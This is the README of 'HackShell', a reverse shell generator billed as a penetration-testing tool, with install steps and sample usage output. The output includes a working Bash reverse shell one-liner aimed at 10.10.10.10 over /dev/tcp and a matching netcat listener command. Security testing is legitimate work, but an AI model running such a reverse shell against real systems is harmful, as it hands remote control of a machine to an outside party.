# HackShell
HackShell is a powerful reverse shell generator for penetration testing, offering customizable shells for multiple platforms (Bash, Python, PowerShell, etc.). It includes extra tools for discovering hidden info like IPs, emails, and domains, making it ideal for streamlined security testing.

## Install 
- From Github :
  ``` 
  git clone https://github.com/HckN1L/HackShell  
  cd HackShell   
  ```  
## Usage
```
$ cd HackShell
$ chmod +x HackShell.sh
$ ./HackShell.sh

 _   _            _     ____  _          _ _ 
| | | | __ _  ___| | __/ ___|| |__   ___| | |
| |_| |/ _` |/ __| |/ /\___ \| '_ \ / _ \ | |
|  _  | (_| | (__|   <  ___) | | | |  __/ | |
|_| |_|\__,_|\___|_|\_\|____/|_| |_|\___|_|_|

==============================================================
https://x.com/HckN1L
https://github.com/HckN1L
https://www.linkedin.com/in/indranil-sen-a1888a256
==============================================================
$ Enter the IP address: 10.10.10.10 
$ Enter the port number: 1234

[+] Reverse Shell Options:
1. Bash
2. Python
3. Perl
4. PHP
5. Netcat (nc)
6. Ruby
7. PowerShell

Choose shell type [1-7]: 1

[+] Bash Reverse Shell:

bash -i >& /dev/tcp/10.10.10.10/1234 0>&1

[+] Netcat Listener: nc -lvnp 1234
```
